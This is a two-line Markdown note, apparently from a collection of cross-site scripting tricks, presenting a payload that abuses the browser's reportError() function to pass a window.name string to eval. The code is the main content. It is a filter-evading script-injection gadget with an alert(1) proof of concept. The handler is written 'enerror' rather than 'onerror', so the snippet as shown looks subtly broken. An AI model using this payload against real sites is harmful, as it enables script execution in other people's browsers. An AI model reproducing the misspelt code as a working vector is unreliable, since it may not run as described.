# XSS
1-The new reportError() function enables a quite amusing XSS vector:
`window.name='alert(1)'`
`reportError(name , enerror=eval)`
